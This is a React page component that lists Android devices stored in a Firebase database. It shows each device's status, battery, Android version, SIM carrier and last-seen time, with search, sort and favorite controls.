// pages/AllDevicesPage.jsx
import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ref, onValue, update } from 'firebase/database';
import { db } from '../firebase/config';

function AllDevicesPage() {
  const navigate = useNavigate();
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [showFavoritesOnly, setShowFavoritesOnly] = useState(false);
  const [sortBy, setSortBy] = useState('serial'); // serial, brand, model, battery, lastSeen

  useEffect(() => {
    const devicesRef = ref(db, 'devices');
    const unsubscribe = onValue(devicesRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        const devicesArray = Object.keys(data).map(key => ({
          id: key,
          ...data[key]
        }));
        setDevices(devicesArray);
      } else {
        setDevices([]);
      }
      setLoading(false);
    });

    return () => unsubscribe();
  }, []);

  // ✅ Toggle Favorite
  const toggleFavorite = async (deviceId, currentState) => {
    try {
      const deviceRef = ref(db, `devices/${deviceId}`);
      await update(deviceRef, { favorite: !currentState });
      
      // Update local state
      setDevices(prev => prev.map(d => 
        d.id === deviceId ? { ...d, favorite: !currentState } : d
      ));
    } catch (error) {
      console.error('Error toggling favorite:', error);
    }
  };

  // ✅ Get Status
  const getStatus = (device) => {
    const lastSeen = device.lastSeen || device.this_app_installTime;
    if (!lastSeen) return { text: 'Offline', color: '#e74c3c', dot: '🔴' };
    const diff = Date.now() - Number(lastSeen);
    if (diff < 60000) return { text: 'Online', color: '#2ecc71', dot: '🟢' };
    if (diff < 300000) return { text: 'Away', color: '#f1c40f', dot: '🟡' };
    return { text: 'Offline', color: '#e74c3c', dot: '🔴' };
  };

  // ✅ Get Battery Color
  const getBatteryColor = (battery) => {
    const value = parseInt(battery);
    if (value >= 70) return '#2ecc71';
    if (value >= 40) return '#f1c40f';
    if (value >= 20) return '#e67e22';
    return '#e74c3c';
  };

  // ✅ Format Time
  const formatTime = (timestamp) => {
    if (!timestamp) return 'Never';
    const date = new Date(timestamp);
    const now = new Date();
    const diff = now - date;
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    return `${Math.floor(diff / 86400000)}d ago`;
  };

  // ✅ Filter & Sort
  const getFilteredDevices = () => {
    let filtered = devices;

    // Search filter
    if (searchTerm) {
      const search = searchTerm.toLowerCase();
      filtered = filtered.filter(d => 
        (d.brand || '').toLowerCase().includes(search) ||
        (d.model || '').toLowerCase().includes(search) ||
        (d.device_id || '').toLowerCase().includes(search) ||
        (d.serialNo?.toString() || '').includes(search)
      );
    }

    // Favorites filter
    if (showFavoritesOnly) {
      filtered = filtered.filter(d => d.favorite === true);
    }

    // Sort
    filtered.sort((a, b) => {
      switch (sortBy) {
        case 'serial':
          return (parseInt(b.serialNo) || 0) - (parseInt(a.serialNo) || 0);
        case 'brand':
          return (a.brand || '').localeCompare(b.brand || '');
        case 'model':
          return (a.model || '').localeCompare(b.model || '');
        case 'battery':
          return (parseInt(b.battery) || 0) - (parseInt(a.battery) || 0);
        case 'lastSeen':
          return (b.lastSeen || 0) - (a.lastSeen || 0);
        default:
          return 0;
      }
    });

    return filtered;
  };

  const filteredDevices = getFilteredDevices();
  const onlineCount = devices.filter(d => {
    const lastSeen = d.lastSeen || d.this_app_installTime;
    return lastSeen && (Date.now() - Number(lastSeen)) < 60000;
  }).length;

  if (loading) {
    return (
      <div style={{ 
        display: 'flex', 
        flexDirection: 'column', 
        alignItems: 'center', 
        justifyContent: 'center', 
        minHeight: '100vh',
        background: 'var(--bg-primary)'
      }}>
        <div style={{ 
          width: '40px', 
          height: '40px', 
          border: '3px solid #e2e8f0', 
          borderTopColor: '#6c63ff', 
          borderRadius: '50%', 
          animation: 'spin 0.8s linear infinite' 
        }}></div>
        <p style={{ color: 'var(--text-muted)', marginTop: '12px' }}>📡 Loading devices...</p>
        <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
      </div>
    );
  }

  return (
    <div style={{ 
      padding: '12px 14px', 
      maxWidth: '100%', 
      background: 'var(--bg-primary)', 
      minHeight: '100vh' 
    }}>
      {/* Header */}
      <div style={{ 
        display: 'flex', 
        alignItems: 'center', 
        gap: '10px', 
        padding: '6px 0 12px', 
        borderBottom: '2px solid var(--border-color)', 
        marginBottom: '14px' 
      }}>
        <button 
          style={{ 
            background: 'none', 
            border: 'none', 
            color: 'var(--text-muted)', 
            fontSize: '14px', 
            fontWeight: 600, 
            cursor: 'pointer',
            padding: '4px 8px',
            borderRadius: '8px',
            transition: 'all 0.2s'
          }}
          onMouseEnter={(e) => e.target.style.background = 'var(--bg-input)'}
          onMouseLeave={(e) => e.target.style.background = 'transparent'}
          onClick={() => navigate('/')}
        >
          ← Back
        </button>
        <h2 style={{ fontSize: '18px', fontWeight: 700, color: 'var(--text-primary)', margin: 0, flex: 1 }}>
          📱 All Devices
        </h2>
        <span style={{ 
          fontSize: '11px', 
          fontWeight: 600, 
          color: '#2ecc71',
          background: 'rgba(46,204,113,0.1)',
          padding: '2px 12px',
          borderRadius: '12px'
        }}>
          🟢 {onlineCount}/{devices.length}
        </span>
      </div>

      {/* Search & Filters */}
      <div style={{ 
        display: 'flex', 
        gap: '8px', 
        marginBottom: '12px',
        flexWrap: 'wrap'
      }}>
        <div style={{ flex: 1, minWidth: '150px' }}>
          <input
            type="text"
            placeholder="🔍 Search devices..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            style={{
              width: '100%',
              padding: '8px 12px',
              border: '2px solid var(--border-color)',
              borderRadius: '8px',
              background: 'var(--bg-input)',
              color: 'var(--text-primary)',
              fontSize: '13px',
              outline: 'none',
              transition: 'all 0.3s'
            }}
            onFocus={(e) => e.target.style.borderColor = '#6c63ff'}
            onBlur={(e) => e.target.style.borderColor = 'var(--border-color)'}
          />
        </div>

        <button
          onClick={() => setShowFavoritesOnly(!showFavoritesOnly)}
          style={{
            padding: '8px 16px',
            border: `2px solid ${showFavoritesOnly ? '#f59e0b' : 'var(--border-color)'}`,
            borderRadius: '8px',
            background: showFavoritesOnly ? 'rgba(245,158,11,0.1)' : 'var(--bg-input)',
            color: showFavoritesOnly ? '#f59e0b' : 'var(--text-muted)',
            cursor: 'pointer',
            fontSize: '12px',
            fontWeight: 600,
            transition: 'all 0.2s',
            whiteSpace: 'nowrap'
          }}
        >
          {showFavoritesOnly ? '⭐ Favorites' : '☆ All'}
        </button>

        <select
          value={sortBy}
          onChange={(e) => setSortBy(e.target.value)}
          style={{
            padding: '8px 12px',
            border: '2px solid var(--border-color)',
            borderRadius: '8px',
            background: 'var(--bg-input)',
            color: 'var(--text-primary)',
            fontSize: '12px',
            outline: 'none',
            cursor: 'pointer'
          }}
        >
          <option value="serial">Sort by Serial</option>
          <option value="brand">Sort by Brand</option>
          <option value="model">Sort by Model</option>
          <option value="battery">Sort by Battery</option>
          <option value="lastSeen">Sort by Last Seen</option>
        </select>
      </div>

      {/* Device Count */}
      <div style={{ 
        fontSize: '12px', 
        color: 'var(--text-muted)', 
        marginBottom: '12px',
        padding: '4px 0'
      }}>
        Showing {filteredDevices.length} of {devices.length} devices
      </div>

      {/* Device List */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
        {filteredDevices.length === 0 ? (
          <div style={{ 
            textAlign: 'center', 
            padding: '40px', 
            color: 'var(--text-muted)' 
          }}>
            <span style={{ fontSize: '48px', display: 'block', marginBottom: '8px' }}>📭</span>
            <p>No devices found</p>
          </div>
        ) : (
          filteredDevices.map((device, index) => {
            const status = getStatus(device);
            const batteryColor = getBatteryColor(device.battery);
            const isFavorite = device.favorite === true;

            return (
              <div
                key={device.id}
                style={{
                  background: 'var(--bg-card)',
                  borderRadius: '10px',
                  padding: '12px 14px',
                  border: '1px solid var(--border-color)',
                  borderLeft: `4px solid ${status.color}`,
                  transition: 'all 0.2s',
                  cursor: 'pointer'
                }}
                onMouseEnter={(e) => e.target.style.boxShadow = '0 2px 12px rgba(0,0,0,0.06)'}
                onMouseLeave={(e) => e.target.style.boxShadow = 'none'}
                onClick={() => navigate(`/device/${device.id}`)}
              >
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                      <span style={{ fontSize: '14px', fontWeight: 700, color: 'var(--text-primary)' }}>
                        #{device.serialNo || 'N/A'}
                      </span>
                      <span style={{ fontSize: '13px', fontWeight: 600, color: 'var(--text-primary)' }}>
                        {device.brand || 'Unknown'} {device.model || 'Device'}
                      </span>
                      <span style={{ 
                        fontSize: '10px', 
                        fontWeight: 600, 
                        color: status.color,
                        background: `${status.color}15`,
                        padding: '1px 10px',
                        borderRadius: '12px'
                      }}>
                        {status.dot} {status.text}
                      </span>
                    </div>
                    <div style={{ 
                      fontSize: '11px', 
                      color: 'var(--text-muted)', 
                      marginTop: '2px',
                      fontFamily: 'monospace'
                    }}>
                      🔑 {device.device_id || device.id}
                    </div>
                  </div>

                  {/* Favorite Button */}
                  <button
                    onClick={(e) => {
                      e.stopPropagation();
                      toggleFavorite(device.id, isFavorite);
                    }}
                    style={{
                      background: 'none',
                      border: 'none',
                      fontSize: '20px',
                      cursor: 'pointer',
                      padding: '4px',
                      color: isFavorite ? '#f59e0b' : 'var(--text-muted)',
                      transition: 'all 0.2s',
                      flexShrink: 0
                    }}
                    onMouseEnter={(e) => e.target.style.transform = 'scale(1.1)'}
                    onMouseLeave={(e) => e.target.style.transform = 'scale(1)'}
                  >
                    {isFavorite ? '⭐' : '☆'}
                  </button>
                </div>

                {/* Device Details */}
                <div style={{ 
                  display: 'grid', 
                  gridTemplateColumns: 'repeat(auto-fit, minmax(120px, 1fr))', 
                  gap: '4px',
                  marginTop: '8px',
                  paddingTop: '8px',
                  borderTop: '1px solid var(--border-color)'
                }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px' }}>
                    <span style={{ color: 'var(--text-muted)' }}>🔋 Battery</span>
                    <span style={{ fontWeight: 600, color: batteryColor }}>{device.battery || 'N/A'}</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px' }}>
                    <span style={{ color: 'var(--text-muted)' }}>🤖 Version</span>
                    <span style={{ fontWeight: 600, color: 'var(--text-primary)' }}>v{device.android_version || 'N/A'}</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px' }}>
                    <span style={{ color: 'var(--text-muted)' }}>📶 SIM</span>
                    <span style={{ fontWeight: 600, color: 'var(--text-primary)' }}>
                      {device.sim_info ? device.sim_info.split(' - ')[0]?.split(': ')[1] || 'N/A' : 'N/A'}
                    </span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px' }}>
                    <span style={{ color: 'var(--text-muted)' }}>🕐 Last Seen</span>
                    <span style={{ fontWeight: 600, color: 'var(--text-primary)' }}>{formatTime(device.lastSeen)}</span>
                  </div>
                </div>
              </div>
            );
          })
        )}
      </div>

      {/* Bottom Padding */}
      <div style={{ height: '20px' }}></div>
    </div>
  );
}

export default AllDevicesPage;